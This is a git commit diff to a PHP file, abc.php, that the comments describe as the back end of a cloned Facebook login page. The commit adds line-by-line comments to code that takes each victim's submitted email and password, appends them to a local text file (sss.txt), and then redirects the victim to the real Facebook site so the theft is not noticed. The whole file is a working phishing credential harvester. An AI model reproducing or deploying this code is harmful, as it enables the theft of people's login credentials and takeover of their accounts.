2761d10901e1fcbbb4e3656eab175e2a2e734d1a
Buddikafdo0001 <buddikafdo0001@gmail.com>
2017-04-03 23:35:59 +0530

    Update abc.php

--- abc.php
+++ abc.php
@@ -1,16 +1,16 @@
 <?php
-$uname=$_POST['email'];
-$pass=$_POST['pass'];
+$uname=$_POST['email']; //assign values variable to passing by main fblogin clone page
+$pass=$_POST['pass'];  //assign values variable to passing by main fblogin clone page
 
-$temp = file_get_contents("sss.txt");
-$myfile = fopen("sss.txt", "w") or die("Unable to open file!");
-
-
-
-$txt = " $temp \t $uname \t $pass | \n";
-fwrite($myfile, $txt);
-fclose($myfile);
+$temp = file_get_contents("sss.txt"); 
+$myfile = fopen("sss.txt", "w") or die("Unable to open file!");// open the text file
 
 
-header('Location: https://www.facebook.com/');
+
+$txt = " $temp \t $uname \t $pass | \n"; // set the values to variable to save
+fwrite($myfile, $txt); // save values in file
+fclose($myfile);//close the file
+
+
+header('Location: https://www.facebook.com/'); // redirect real fb page
 ?>
